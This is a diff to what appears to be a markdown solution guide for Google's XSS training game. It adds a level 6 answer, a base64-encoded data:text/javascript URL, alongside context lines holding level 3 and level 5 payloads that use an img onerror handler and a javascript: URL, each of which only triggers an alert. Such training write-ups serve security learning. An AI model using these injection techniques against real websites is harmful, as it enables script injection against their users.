@@ -25,3 +25,8 @@ https://xss-game.appspot.com/level3/frame/#"/><img src='asdf' onerror='alert("HA
 ```
 https://xss-game.appspot.com/level5/frame/signup?next=javascript:alert()
 ```
+### Level 6
+```
+base64(alert("HACKED");) => "YWxlcnQoIkhBQ0tFRCIpOw=="
+https://xss-game.appspot.com/level6/frame#data:text/javascript;base64,YWxlcnQoIkhBQ0tFRCIpOw==
+```
